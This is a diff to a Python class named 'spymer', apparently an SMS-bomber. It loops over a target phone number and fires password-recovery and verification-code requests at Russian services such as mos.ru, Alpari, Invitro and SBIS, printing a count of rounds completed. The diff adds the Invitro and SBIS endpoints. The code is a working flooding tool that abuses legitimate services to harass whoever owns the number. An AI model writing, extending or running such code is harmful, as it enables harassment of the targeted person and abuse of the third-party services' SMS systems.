@@ -94,8 +94,9 @@ class spymer:
 			loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={'login': _phone, 'attr': ''})
 			_emailalpari = _name+f'{iteration}'+'@gmail.com'
 			alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _emailalpari, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-
-
+			invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
+			onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
+			
 			
 			iteration += 1
 			print(('{} круг пройден.').format(iteration))
